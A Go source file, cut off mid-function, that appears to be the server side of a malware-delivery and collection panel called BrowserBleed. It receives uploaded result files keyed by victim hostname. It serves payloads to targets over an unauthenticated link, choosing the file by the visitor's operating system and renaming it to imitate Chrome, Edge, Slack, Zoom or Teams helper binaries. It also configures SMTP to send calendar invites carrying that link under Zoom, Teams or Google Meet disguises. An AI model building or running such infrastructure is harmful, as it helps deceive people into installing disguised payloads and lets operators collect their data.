package handler

import (
	"archive/zip"
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"crypto/hmac"
	"crypto/rand"
	"crypto/sha256"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"errors"
	"fmt"
	"html/template"
	"io"
	"io/fs"
	"log"
	"mime"
	"net/http"
	"net/smtp"
	"net/url"
	"os"
	"path/filepath"
	"regexp"
	"sort"
	"strings"
	"time"
)

type ReportMeta struct {
	ID         string    `json:"id"`
	Hostname   string    `json:"hostname"`
	UploadedAt time.Time `json:"uploaded_at"`
	ExpiresAt  time.Time `json:"expires_at"`
	RunAt      string    `json:"run_at"`
	HitCount   string    `json:"hit_count"`
	HasCSV     bool      `json:"has_csv"`
}

type presetDef struct {
	winFile, winDL string
	macFile, macDL string
	linFile, linDL string
}

var presetDefs = map[string]presetDef{
	// winFile = filename on disk (what build_windows.ps1 -Preset X creates)
	// winDL   = filename served to the browser (disguised name the target sees)
	"chrome":   {winFile: "chrome.exe",   winDL: "chrome_crashpad_handler.exe", macFile: "BrowserBleed_mac", macDL: "Google Chrome Helper",   linFile: "google-chrome",    linDL: "google-chrome"},
	"edge":     {winFile: "edge.exe",     winDL: "msedge_crashpad_handler.exe", macFile: "BrowserBleed_mac", macDL: "Microsoft Edge Helper",   linFile: "microsoft-edge",   linDL: "microsoft-edge"},
	"brave":    {winFile: "brave.exe",    winDL: "brave_crashpad_handler.exe",  macFile: "BrowserBleed_mac", macDL: "Brave Browser Helper",    linFile: "brave-browser",    linDL: "brave-browser"},
	"firefox":  {winFile: "firefox.exe",  winDL: "plugin-container.exe",        macFile: "BrowserBleed_mac", macDL: "Firefox",                 linFile: "firefox",          linDL: "firefox"},
	"opera":    {winFile: "opera.exe",    winDL: "opera_crashpad_handler.exe",  macFile: "BrowserBleed_mac", macDL: "Opera Helper",            linFile: "opera",            linDL: "opera"},
	"slack":    {winFile: "slack.exe",    winDL: "slack.exe",                   macFile: "BrowserBleed_mac", macDL: "Slack Helper",            linFile: "slack",            linDL: "slack"},
	"discord":  {winFile: "discord.exe",  winDL: "Discord.exe",                 macFile: "BrowserBleed_mac", macDL: "Discord Helper",          linFile: "discord",          linDL: "discord"},
	"teams":    {winFile: "ms-teams.exe", winDL: "ms-teams.exe",                macFile: "BrowserBleed_mac", macDL: "Microsoft Teams Helper",  linFile: "teams",            linDL: "teams"},
	"zoom":     {winFile: "zoom.exe",     winDL: "Zoom.exe",                    macFile: "BrowserBleed_mac", macDL: "ZoomHelper",              linFile: "zoom",             linDL: "zoom"},
	"whatsapp": {winFile: "whatsapp.exe", winDL: "WhatsApp.exe",                macFile: "BrowserBleed_mac", macDL: "WhatsApp Helper",         linFile: "whatsapp-desktop", linDL: "whatsapp-desktop"},
	"telegram": {winFile: "telegram.exe", winDL: "Telegram.exe",                macFile: "BrowserBleed_mac", macDL: "Telegram Desktop",        linFile: "telegram-desktop", linDL: "telegram-desktop"},
}


var (
	reID       = regexp.MustCompile(`^[0-9a-f]{16}$`)
	reRunAt    = regexp.MustCompile(`Run:\s+(.+)`)
	reHits     = regexp.MustCompile(`\[\+\] (\d+ unique hit\(s\)[^\n]*)`)
	reUnsafe   = regexp.MustCompile(`[^a-zA-Z0-9\-_]`)
)

type PayloadMeta struct {
	Name     string
	Size     int64
	ModTime  time.Time
	Preset   string
	Platform string
}

type PayloadsData struct {
	Windows []PayloadMeta
	Mac     []PayloadMeta
	Linux   []PayloadMeta
	BaseURL string
}

func detectPlatform(name, filePath string) string {
	if strings.HasSuffix(strings.ToLower(name), ".exe") {
		return "windows"
	}
	f, err := os.Open(filePath)
	if err != nil {
		return "linux"
	}
	defer f.Close()
	magic := make([]byte, 4)
	if _, err := io.ReadFull(f, magic); err != nil {
		return "linux"
	}
	// Mach-O: FE ED FA CE (32-bit), FE ED FA CF (64-bit), CA FE BA BE (fat)
	if (magic[0] == 0xFE && magic[1] == 0xED && magic[2] == 0xFA && (magic[3] == 0xCE || magic[3] == 0xCF)) ||
		(magic[0] == 0xCA && magic[1] == 0xFE && magic[2] == 0xBA && magic[3] == 0xBE) {
		return "mac"
	}
	return "linux"
}

func detectPreset(name string) string {
	lower := strings.ToLower(name)
	switch {
	case strings.Contains(lower, "chrome"):
		return "chrome"
	case strings.Contains(lower, "edge"):
		return "edge"
	case strings.Contains(lower, "brave"):
		return "brave"
	case strings.Contains(lower, "firefox") || strings.Contains(lower, "plugin-container"):
		return "firefox"
	case strings.Contains(lower, "opera"):
		return "opera"
	case strings.Contains(lower, "slack"):
		return "slack"
	case strings.Contains(lower, "discord"):
		return "discord"
	case strings.Contains(lower, "teams"):
		return "teams"
	case strings.Contains(lower, "zoom"):
		return "zoom"
	case strings.Contains(lower, "whatsapp"):
		return "whatsapp"
	case strings.Contains(lower, "telegram"):
		return "telegram"
	default:
		return ""
	}
}

func detectOS(ua string) string {
	ua = strings.ToLower(ua)
	switch {
	case strings.Contains(ua, "windows nt"):
		return "windows"
	case strings.Contains(ua, "macintosh") || strings.Contains(ua, "mac os x"):
		return "macos"
	case strings.Contains(ua, "linux") && !strings.Contains(ua, "android"):
		return "linux"
	default:
		return ""
	}
}

type Handler struct {
	apiKey      string
	encKey      []byte
	dataDir     string
	payloadsDir string
	buildsDir   string
	baseURL     string
	ttl         time.Duration
	indexTpl    *template.Template
	reportTpl   *template.Template
	loginTpl    *template.Template
	payloadsTpl *template.Template
	guideTpl    *template.Template
}

func deriveKey(hexKey string) ([]byte, error) {
	key, err := hex.DecodeString(hexKey)
	if err != nil || len(key) != 32 {
		return nil, errors.New("ENCRYPTION_KEY must be a 64-char hex string (32 bytes) - generate with: openssl rand -hex 32")
	}
	return key, nil
}

func encrypt(key, plaintext []byte) ([]byte, error) {
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}
	nonce := make([]byte, gcm.NonceSize())
	if _, err := io.ReadFull(rand.Reader, nonce); err != nil {
		return nil, err
	}
	return gcm.Seal(nonce, nonce, plaintext, nil), nil
}

func newID() (string, error) {
	b := make([]byte, 8)
	if _, err := rand.Read(b); err != nil {
		return "", err
	}
	return hex.EncodeToString(b), nil
}

func decrypt(key, ciphertext []byte) ([]byte, error) {
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}
	if len(ciphertext) < gcm.NonceSize() {
		return nil, errors.New("ciphertext too short")
	}
	nonce, ct := ciphertext[:gcm.NonceSize()], ciphertext[gcm.NonceSize():]
	return gcm.Open(nil, nonce, ct, nil)
}

func New(apiKey, encKeyHex, dataDir, baseURL string, ttl time.Duration, webFS fs.FS) (*Handler, error) {
	encKey, err := deriveKey(encKeyHex)
	if err != nil {
		return nil, err
	}

	funcMap := template.FuncMap{
		"fmtTime": func(t time.Time) string {
			return t.UTC().Format("2006-01-02 15:04 UTC")
		},
		"fmtSize": func(n int64) string {
			switch {
			case n >= 1<<20:
				return fmt.Sprintf("%.1f MB", float64(n)/float64(1<<20))
			case n >= 1<<10:
				return fmt.Sprintf("%.1f KB", float64(n)/float64(1<<10))
			default:
				return fmt.Sprintf("%d B", n)
			}
		},
	}
	indexTpl, err := template.New("index.html").Funcs(funcMap).ParseFS(webFS, "index.html")
	if err != nil {
		return nil, err
	}
	reportTpl, err := template.New("report.html").Funcs(funcMap).ParseFS(webFS, "report.html")
	if err != nil {
		return nil, err
	}
	loginTpl, err := template.New("login.html").Funcs(funcMap).ParseFS(webFS, "login.html")
	if err != nil {
		return nil, err
	}
	payloadsTpl, err := template.New("payloads.html").Funcs(funcMap).ParseFS(webFS, "payloads.html")
	if err != nil {
		return nil, err
	}
	guideTpl, err := template.New("guide.html").Funcs(funcMap).ParseFS(webFS, "guide.html")
	if err != nil {
		return nil, err
	}

	payloadsDir := filepath.Join(dataDir, "payloads")
	if err := os.MkdirAll(payloadsDir, 0750); err != nil {
		return nil, err
	}
	buildsDir := filepath.Join(dataDir, "builds")
	if err := os.MkdirAll(buildsDir, 0750); err != nil {
		return nil, err
	}

	return &Handler{
		apiKey:      apiKey,
		encKey:      encKey,
		dataDir:     dataDir,
		payloadsDir: payloadsDir,
		buildsDir:   buildsDir,
		baseURL:     strings.TrimRight(baseURL, "/"),
		ttl:         ttl,
		indexTpl:    indexTpl,
		reportTpl:   reportTpl,
		loginTpl:    loginTpl,
		payloadsTpl: payloadsTpl,
		guideTpl:    guideTpl,
	}, nil
}

func (h *Handler) RegisterRoutes(mux *http.ServeMux) {
	mux.HandleFunc("/upload", h.handleUpload)
	mux.HandleFunc("/login", h.handleLogin)
	mux.HandleFunc("/r/delete-bulk", h.handleDeleteBulk)
	mux.HandleFunc("/r/export-bulk", h.handleExportBulk)
	mux.HandleFunc("/r/", h.handleReport)
	mux.HandleFunc("/payloads", h.handlePayloads)
	mux.HandleFunc("/payloads/", h.handlePayloadFile)
	mux.HandleFunc("/builds/claim", h.handleBuildClaim)
	mux.HandleFunc("/builds", h.handleBuilds)
	mux.HandleFunc("/builds/", h.handleBuildItem)
	mux.HandleFunc("/invite/config", h.handleInviteConfig)
	mux.HandleFunc("/invite/send", h.handleInviteSend)
	mux.HandleFunc("/auth/", h.handleAuth)
	mux.HandleFunc("/guide", h.handleGuide)
	mux.HandleFunc("/p/", h.handleSmartDeliver)
	mux.HandleFunc("/", h.handleIndex)
}

// StartCleanup launches the expiry goroutine. Call after New.
func (h *Handler) StartCleanup() {
	go func() {
		for {
			time.Sleep(15 * time.Minute)
			h.deleteExpired()
		}
	}()
}

func (h *Handler) deleteExpired() {
	entries, err := os.ReadDir(h.dataDir)
	if err != nil {
		return
	}
	now := time.Now().UTC()
	for _, e := range entries {
		if !e.IsDir() {
			continue
		}
		id := e.Name()
		if !reID.MatchString(id) {
			continue
		}
		data, err := os.ReadFile(filepath.Join(h.dataDir, id, "meta.json"))
		if err != nil {
			continue
		}
		var m ReportMeta
		if err := json.Unmarshal(data, &m); err != nil {
			continue
		}
		if !m.ExpiresAt.IsZero() && now.After(m.ExpiresAt) {
			log.Printf("[cleanup] expiring report %s (hostname=%s)", id, m.Hostname)
			os.RemoveAll(filepath.Join(h.dataDir, id))
		}
	}
}

func (h *Handler) bearerAuth(r *http.Request) bool {
	auth := r.Header.Get("Authorization")
	return strings.HasPrefix(auth, "Bearer ") && strings.TrimPrefix(auth, "Bearer ") == h.apiKey
}

func (h *Handler) cookieAuth(r *http.Request) bool {
	c, err := r.Cookie("bb_key")
	return err == nil && c.Value == h.apiKey
}

func (h *Handler) isAPIRequest(r *http.Request) bool {
	return r.Header.Get("Authorization") != "" ||
		strings.Contains(r.Header.Get("Accept"), "application/json")
}

// requireAuth checks Bearer or cookie. If not authenticated, returns false
// and sends appropriate response (401 for API, redirect for browser).
func (h *Handler) requireAuth(w http.ResponseWriter, r *http.Request) bool {
	if h.bearerAuth(r) || h.cookieAuth(r) {
		return true
	}
	if h.isAPIRequest(r) {
		http.Error(w, "unauthorized", http.StatusUnauthorized)
	} else {
		http.Redirect(w, r, "/login", http.StatusSeeOther)
	}
	return false
}

func (h *Handler) resolveBaseURL(r *http.Request) string {
	if h.baseURL != "" {
		return h.baseURL
	}
	scheme := "https"
	if r.TLS == nil && r.Header.Get("X-Forwarded-Proto") != "https" {
		scheme = "http"
	}
	return scheme + "://" + r.Host
}

func (h *Handler) setSessionCookie(w http.ResponseWriter) {
	http.SetCookie(w, &http.Cookie{
		Name:     "bb_key",
		Value:    h.apiKey,
		HttpOnly: true,
		Secure:   true,
		SameSite: http.SameSiteStrictMode,
		Path:     "/",
		// No MaxAge / Expires = session cookie
	})
}

func (h *Handler) reportURL(r *http.Request, id string) string {
	base := h.baseURL
	if base == "" {
		scheme := "https"
		if r.TLS == nil && r.Header.Get("X-Forwarded-Proto") != "https" {
			scheme = "http"
		}
		base = scheme + "://" + r.Host
	}
	return base + "/r/" + id
}

func (h *Handler) handleLogin(w http.ResponseWriter, r *http.Request) {
	type loginData struct{ Error string }
	switch r.Method {
	case http.MethodGet:
		w.Header().Set("Content-Type", "text/html; charset=utf-8")
		h.loginTpl.Execute(w, loginData{})
	case http.MethodPost:
		r.ParseForm()
		key := r.FormValue("key")
		if key == h.apiKey {
			h.setSessionCookie(w)
			http.Redirect(w, r, "/", http.StatusSeeOther)
			return
		}
		w.Header().Set("Content-Type", "text/html; charset=utf-8")
		w.WriteHeader(http.StatusUnauthorized)
		h.loginTpl.Execute(w, loginData{Error: "Invalid API key."})
	default:
		http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
	}
}

func (h *Handler) handleUpload(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
		return
	}
	if !h.bearerAuth(r) {
		http.Error(w, "unauthorized", http.StatusUnauthorized)
		return
	}

	if err := r.ParseMultipartForm(64 << 20); err != nil {
		http.Error(w, "bad request", http.StatusBadRequest)
		return
	}

	hostname := r.FormValue("hostname")

	txtFile, _, err := r.FormFile("txt")
	if err != nil {
		http.Error(w, "missing txt file", http.StatusBadRequest)
		return
	}
	defer txtFile.Close()
	txtData, err := io.ReadAll(txtFile)
	if err != nil {
		http.Error(w, "read error", http.StatusInternalServerError)
		return
	}

	id, err := newID()
	if err != nil {
		http.Error(w, "internal error", http.StatusInternalServerError)
		return
	}

	dir := filepath.Join(h.dataDir, id)
	if err := os.MkdirAll(dir, 0750); err != nil {
		http.Error(w, "internal error", http.StatusInternalServerError)
		return
	}

	// Encrypt and write txt
	encTxt, err := encrypt(h.encKey, txtData)
	if err != nil {
		http.Error(w, "encryption failed", http.StatusInternalServerError)
		return
	}
	if err := os.WriteFile(filepath.Join(dir, "results.txt.enc"), encTxt, 0600); err != nil {
		http.Error(w, "write error", http.StatusInternalServerError)
		return
	}

	// Encrypt and write csv if present
	hasCSV := false
	if csvFile, _, err := r.FormFile("csv"); err == nil {
		defer csvFile.Close()
		csvData, _ := io.ReadAll(csvFile)
		if len(csvData) > 0 {
			encCSV, err := encrypt(h.encKey, csvData)
			if err == nil {
				os.WriteFile(filepath.Join(dir, "results.csv.enc"), encCSV, 0600)
				hasCSV = true
			}
		}
	}

	// Parse metadata from plaintext (in memory only - never written unencrypted)
	txtStr := string(txtData)
	runAt := ""
	if m := reRunAt.FindStringSubmatch(txtStr); len(m) > 1 {
		runAt = strings.TrimSpace(m[1])
	}
	hitCount := ""
	if m := reHits.FindStringSubmatch(txtStr); len(m) > 1 {
		hitCount = strings.TrimSpace(m[1])
	}

	now := time.Now().UTC()
	meta := ReportMeta{
		ID:         id,
		Hostname:   hostname,
		UploadedAt: now,
		ExpiresAt:  now.Add(h.ttl),
		RunAt:      runAt,
		HitCount:   hitCount,
		HasCSV:     hasCSV,
	}
	metaBytes, _ := json.Marshal(meta)
	os.WriteFile(filepath.Join(dir, "meta.json"), metaBytes, 0640)

	log.Printf("[upload] id=%s hostname=%s hits=%s expires=%s", id, hostname, hitCount, meta.ExpiresAt.Format(time.RFC3339))

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]string{
		"id":  id,
		"url": h.reportURL(r, id),
	})
}

func (h *Handler) handleIndex(w http.ResponseWriter, r *http.Request) {
	if r.URL.Path != "/" {
		http.NotFound(w, r)
		return
	}
	if !h.requireAuth(w, r) {
		return
	}

	entries, _ := os.ReadDir(h.dataDir)
	var reports []ReportMeta
	for _, e := range entries {
		if !e.IsDir() {
			continue
		}
		id := e.Name()
		if !reID.MatchString(id) {
			continue
		}
		data, err := os.ReadFile(filepath.Join(h.dataDir, id, "meta.json"))
		if err != nil {
			continue
		}
		var m ReportMeta
		if err := json.Unmarshal(data, &m); err != nil {
			continue
		}
		reports = append(reports, m)
	}
	sort.Slice(reports, func(i, j int) bool {
		return reports[i].UploadedAt.After(reports[j].UploadedAt)
	})

	w.Header().Set("Content-Type", "text/html; charset=utf-8")
	h.indexTpl.Execute(w, reports)
}

func (h *Handler) handleGuide(w http.ResponseWriter, r *http.Request) {
	if !h.requireAuth(w, r) {
		return
	}
	w.Header().Set("Content-Type", "text/html; charset=utf-8")
	h.guideTpl.Execute(w, nil)
}

func (h *Handler) handleReport(w http.ResponseWriter, r *http.Request) {
	if !h.requireAuth(w, r) {
		return
	}

	parts := strings.SplitN(strings.TrimPrefix(r.URL.Path, "/r/"), "/", 2)
	id := parts[0]
	if !reID.MatchString(id) {
		http.NotFound(w, r)
		return
	}
	dir := filepath.Join(h.dataDir, id)

	// Sub-paths: downloads and delete action
	if len(parts) == 2 {
		switch parts[1] {
		case "results.txt":
			h.serveDecrypted(w, r, filepath.Join(dir, "results.txt.enc"), "text/plain; charset=utf-8", "results.txt")
		case "results.csv":
			h.serveDecrypted(w, r, filepath.Join(dir, "results.csv.enc"), "text/csv; charset=utf-8", "results.csv")
		case "delete":
			h.handleReportDelete(w, r, id)
		default:
			http.NotFound(w, r)
		}
		return
	}

	metaData, err := os.ReadFile(filepath.Join(dir, "meta.json"))
	if err != nil {
		http.NotFound(w, r)
		return
	}
	var meta ReportMeta
	if err := json.Unmarshal(metaData, &meta); err != nil {
		http.Error(w, "internal error", http.StatusInternalServerError)
		return
	}

	enc, err := os.ReadFile(filepath.Join(dir, "results.txt.enc"))
	if err != nil {
		http.Error(w, "report not found", http.StatusNotFound)
		return
	}
	content, err := decrypt(h.encKey, enc)
	if err != nil {
		http.Error(w, "decryption failed", http.StatusInternalServerError)
		return
	}

	type reportPage struct {
		Meta    ReportMeta
		Content string
	}

	w.Header().Set("Content-Type", "text/html; charset=utf-8")
	h.reportTpl.Execute(w, reportPage{Meta: meta, Content: string(content)})
}

func (h *Handler) serveDecrypted(w http.ResponseWriter, r *http.Request, encPath, contentType, filename string) {
	enc, err := os.ReadFile(encPath)
	if err != nil {
		http.NotFound(w, r)
		return
	}
	plain, err := decrypt(h.encKey, enc)
	if err != nil {
		http.Error(w, "decryption failed", http.StatusInternalServerError)
		return
	}
	w.Header().Set("Content-Type", contentType)
	w.Header().Set("Content-Disposition", `attachment; filename="`+filename+`"`)
	w.Write(plain)
}

func (h *Handler) handleDeleteBulk(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
		return
	}
	if !h.requireAuth(w, r) {
		return
	}
	var body struct {
		IDs []string `json:"ids"`
	}
	if err := json.NewDecoder(r.Body).Decode(&body); err != nil || len(body.IDs) == 0 {
		http.Error(w, "bad request", http.StatusBadRequest)
		return
	}
	deleted := 0
	for _, id := range body.IDs {
		if !reID.MatchString(id) {
			continue
		}
		if err := os.RemoveAll(filepath.Join(h.dataDir, id)); err == nil {
			deleted++
		}
	}
	log.Printf("[delete-bulk] removed %d/%d reports", deleted, len(body.IDs))
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]int{"deleted": deleted})
}

// POST /r/export-bulk — zip selected reports as HOSTNAME_DATE.txt/.csv
func (h *Handler) handleExportBulk(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
		return
	}
	if !h.requireAuth(w, r) {
		return
	}
	var body struct {
		IDs []string `json:"ids"`
	}
	if err := json.NewDecoder(r.Body).Decode(&body); err != nil || len(body.IDs) == 0 {
		http.Error(w, "bad request", http.StatusBadRequest)
		return
	}

	zipName := "reports-" + time.Now().UTC().Format("2006-01-02") + ".zip"
	w.Header().Set("Content-Type", "application/zip")
	w.Header().Set("Content-Disposition", `attachment; filename="`+zipName+`"`)

	zw := zip.NewWriter(w)
	defer zw.Close()

	seen := map[string]int{}
	for _, id := range body.IDs {
		if !reID.MatchString(id) {
			continue
		}
		dir := filepath.Join(h.dataDir, id)
		metaRaw, err := os.ReadFile(filepath.Join(dir, "meta.json"))
		if err != nil {
			continue
		}
		var meta ReportMeta
		if err := json.Unmarshal(metaRaw, &meta); err != nil {
			continue
		}

		host := reUnsafe.ReplaceAllString(meta.Hostname, "_")
		if host == "" {
			host = "unknown"
		}
		date := meta.UploadedAt.UTC().Format("2006-01-02")
		if len(meta.RunAt) >= 10 {
			date = meta.RunAt[:10]
		}
		base := host + "_" + date
		if n := seen[base]; n > 0 {
			base = fmt.Sprintf("%s_%d", base, n+1)
		}
		seen[base]++

		if enc, err := os.ReadFile(filepath.Join(dir, "results.txt.enc")); err == nil {
			if plain, err := decrypt(h.encKey, enc); err == nil {
				if f, err := zw.Create(base + ".txt"); err == nil {
					f.Write(plain)
				}
			}
		}
		if enc, err := os.ReadFile(filepath.Join(dir, "results.csv.enc")); err == nil {
			if plain, err := decrypt(h.encKey, enc); err == nil {
				if f, err := zw.Create(base + ".csv"); err == nil {
					f.Write(plain)
				}
			}
		}
	}
	log.Printf("[export-bulk] zipped %d reports", len(body.IDs))
}

// handleReport handles DELETE as report deletion; GET/other as report view.
// We add a delete action via POST /r/{id}/delete so plain HTML forms work.
func (h *Handler) handleReportDelete(w http.ResponseWriter, r *http.Request, id string) {
	if !h.requireAuth(w, r) {
		return
	}
	dir := filepath.Join(h.dataDir, id)
	if !reID.MatchString(id) || !dirExists(dir) {
		http.NotFound(w, r)
		return
	}
	if err := os.RemoveAll(dir); err != nil {
		http.Error(w, "delete failed", http.StatusInternalServerError)
		return
	}
	log.Printf("[delete] report %s removed", id)
	if h.isAPIRequest(r) {
		w.Header().Set("Content-Type", "application/json")
		w.Write([]byte(`{"deleted":true}`))
		return
	}
	http.Redirect(w, r, "/", http.StatusSeeOther)
}

func dirExists(p string) bool {
	fi, err := os.Stat(p)
	return err == nil && fi.IsDir()
}

func (h *Handler) handlePayloads(w http.ResponseWriter, r *http.Request) {
	if !h.requireAuth(w, r) {
		return
	}
	switch r.Method {
	case http.MethodGet:
		entries, _ := os.ReadDir(h.payloadsDir)
		var data PayloadsData
		for _, e := range entries {
			if e.IsDir() {
				continue
			}
			fi, err := e.Info()
			if err != nil {
				continue
			}
			filePath := filepath.Join(h.payloadsDir, e.Name())
			platform := detectPlatform(e.Name(), filePath)
			pm := PayloadMeta{Name: e.Name(), Size: fi.Size(), ModTime: fi.ModTime().UTC(), Preset: detectPreset(e.Name()), Platform: platform}
			switch platform {
			case "windows":
				data.Windows = append(data.Windows, pm)
			case "mac":
				data.Mac = append(data.Mac, pm)
			default:
				data.Linux = append(data.Linux, pm)
			}
		}
		data.BaseURL = h.resolveBaseURL(r)
		w.Header().Set("Content-Type", "text/html; charset=utf-8")
		h.payloadsTpl.Execute(w, data)

	case http.MethodPost:
		if err := r.ParseMultipartForm(256 << 20); err != nil {
			http.Error(w, "bad request", http.StatusBadRequest)
			return
		}
		f, fh, err := r.FormFile("file")
		if err != nil {
			http.Error(w, "missing file", http.StatusBadRequest)
			return
		}
		defer f.Close()
		name := filepath.Base(fh.Filename)
		dst, err := os.OpenFile(filepath.Join(h.payloadsDir, name), os.O_CREATE|os.O_WRONLY|os.O_TRUNC, 0640)
		if err != nil {
			http.Error(w, "write error", http.StatusInternalServerError)
			return
		}
		defer dst.Close()
		if _, err := io.Copy(dst, f); err != nil {
			http.Error(w, "write error", http.StatusInternalServerError)
			return
		}
		log.Printf("[payload] uploaded %s (%d bytes)", name, fh.Size)
		http.Redirect(w, r, "/payloads", http.StatusSeeOther)

	default:
		http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
	}
}

func (h *Handler) handlePayloadFile(w http.ResponseWriter, r *http.Request) {
	if !h.requireAuth(w, r) {
		return
	}
	parts := strings.SplitN(strings.TrimPrefix(r.URL.Path, "/payloads/"), "/", 2)
	name := filepath.Base(parts[0])
	if name == "" || name == "." {
		http.NotFound(w, r)
		return
	}
	fullPath := filepath.Join(h.payloadsDir, name)

	if r.Method == http.MethodPost && len(parts) == 2 && parts[1] == "delete" {
		if err := os.Remove(fullPath); err != nil {
			http.Error(w, "delete failed", http.StatusInternalServerError)
			return
		}
		log.Printf("[payload] deleted %s", name)
		http.Redirect(w, r, "/payloads", http.StatusSeeOther)
		return
	}

	if r.Method != http.MethodGet {
		http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
		return
	}
	data, err := os.ReadFile(fullPath)
	if err != nil {
		http.NotFound(w, r)
		return
	}
	ct := mime.TypeByExtension(filepath.Ext(name))
	if ct == "" {
		ct = "application/octet-stream"
	}
	w.Header().Set("Content-Type", ct)
	w.Header().Set("Content-Disposition", `attachment; filename="`+name+`"`)
	w.Write(data)
}

// handleSmartDeliver serves the right payload for the target's OS, detected
// from their User-Agent. No auth — this URL goes inside ICS invites sent to targets.
func (h *Handler) handleSmartDeliver(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodGet {
		http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
		return
	}

	preset := strings.ToLower(strings.Trim(strings.TrimPrefix(r.URL.Path, "/p/"), "/"))
	def, ok := presetDefs[preset]
	if !ok {
		http.NotFound(w, r)
		return
	}

	targetOS := detectOS(r.Header.Get("User-Agent"))
	var storedName, dlName string
	switch targetOS {
	case "windows":
		storedName, dlName = def.winFile, def.winDL
	case "macos":
		storedName, dlName = def.macFile, def.macDL
	case "linux":
		storedName, dlName = def.linFile, def.linDL
	default:
		http.NotFound(w, r)
		return
	}

	// Try the canonical filename first; fall back to scanning payloadsDir for
	// any uploaded file that matches this preset+OS combination.
	filePath := filepath.Join(h.payloadsDir, storedName)
	if _, err := os.Stat(filePath); os.IsNotExist(err) {
		if found := h.findPayload(preset, targetOS); found != "" {
			storedName = found
			filePath = filepath.Join(h.payloadsDir, storedName)
		}
	}

	f, err := os.Open(filePath)
	if err != nil {
		http.NotFound(w, r)
		return
	}
	defer f.Close()

	log.Printf("[deliver] preset=%s os=%s file=%s ip=%s ua=%q",
		preset, targetOS, storedName, r.RemoteAddr, r.Header.Get("User-Agent"))

	w.Header().Set("Content-Type", "application/octet-stream")
	w.Header().Set("Content-Disposition", `attachment; filename="`+dlName+`"`)
	io.Copy(w, f)
}

// ── Email / invite ─────────────────────────────────────────────────────────────

type EmailConfig struct {
	Provider  string `json:"provider"`
	SMTPHost  string `json:"smtp_host"`
	SMTPPort  int    `json:"smtp_port"`
	SMTPUser  string `json:"smtp_user"`
	SMTPPass  string `json:"smtp_pass"`
	FromName  string `json:"from_name"`
	FromEmail string `json:"from_email"`
}

var smtpProviders = map[string]struct{ host string; port int }{
	"gmail":     {"smtp.gmail.com", 587},
	"outlook":   {"smtp-mail.outlook.com", 587},
	"office365": {"smtp.office365.com", 587},
}

var presetDisguises = map[string]string{
	"chrome": "zoom", "edge": "teams", "brave": "zoom",
	"firefox": "google-meet", "opera": "zoom",
	"slack": "zoom", "discord": "zoom", "teams": "teams",
	"zoom": "zoom", "whatsapp": "zoom", "telegram": "zoom",
}

func (h *Handler) emailConfigPath() string {
	return filepath.Join(h.dataDir, "email_config.json.enc")
}

func (h *Handler) loadEmailConfig() (*EmailConfig, error) {
	data, err := os.ReadFile(h.emailConfigPath())
	if err != nil {
		if os.IsNotExist(err) {
			return &EmailConfig{Provider: "gmail", SMTPPort: 587}, nil
		}
		return nil, err
	}
	plain, err := decrypt(h.encKey, data)
	if err != nil {
		return nil, err
	}
	var cfg EmailConfig
	if err := json.Unmarshal(plain, &cfg); err != nil {
		return nil, err
	}
	return &cfg, nil
}

func (h *Handler) saveEmailConfig(cfg *EmailConfig) error {
	data, err := json.Marshal(cfg)
	if err != nil {
		return err
	}
	enc, err := encrypt(h.encKey, data)
	if err != nil {
		return err
	}
	return os.WriteFile(h.emailConfigPath(), enc, 0600)
}

func (h *Handler) handleInviteConfig(w http.ResponseWriter, r *http.Request) {
	if !h.requireAuth(w, r) {
		return
	}
	switch r.Method {
	case http.MethodGet:
		cfg, err := h.loadEmailConfig()
		if err != nil {
			http.Error(w, "internal error", http.StatusInternalServerError)
			return
		}
		masked := *cfg
		if masked.SMTPPass != "" {
			masked.SMTPPass = "••••••••"
		}
		w.Header().Set("Content-Type", "application/json")
		json.NewEncoder(w).Encode(masked)

	case http.MethodPost:
		var incoming EmailConfig
		if err := json.NewDecoder(r.Body).Decode(&incoming); err != nil {
			http.Error(w, "bad request", http.StatusBadRequest)
			return
		}
		if incoming.SMTPPass == "••••••••" {
			if existing, err := h.loadEmailConfig(); err == nil {
				incoming.SMTPPass = existing.SMTPPass
			}
		}
		if p, ok := smtpProviders[incoming.Provider]; ok && incoming.SMTPHost == "" {
			incoming.SMTPHost = p.host
			if incoming.SMTPPort == 0 {
				incoming.SMTPPort = p.port
			}
		}
		if err := h.saveEmailConfig(&incoming); err != nil {
			http.Error(w, "save failed", http.StatusInternalServerError)
			return
		}
		log.Printf("[invite] config saved provider=%s user=%s", incoming.Provider, incoming.SMTPUser)
		w.Header().Set("Content-Type", "application/json")
		w.Write([]byte(`{"ok":true}`))

	default:
		http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
	}
}

func (h *Handler) handleInviteSend(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
		return
	}
	if !h.requireAuth(w, r) {
		return
	}
	var req struct {
		Preset      string   `json:"preset"`
		ToEmails    []string `json:"to"`
		Subject     string   `json:"subject"`
		StartISO    string   `json:"start"`
		DurationMin int      `json:"duration"`
		Disguise    string   `json:"disguise"`
		FromName    string   `json:"from_name"`
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		http.Error(w, "bad request", http.StatusBadRequest)
		return
	}
	if _, ok := presetDefs[req.Preset]; !ok {
		http.Error(w, "unknown preset", http.StatusBadRequest)
		return
	}
	if len(req.ToEmails) == 0 {
		http.Error(w, "no recipients", http.StatusBadRequest)
		return
	}
	if req.DurationMin <= 0 {
		req.DurationMin = 60
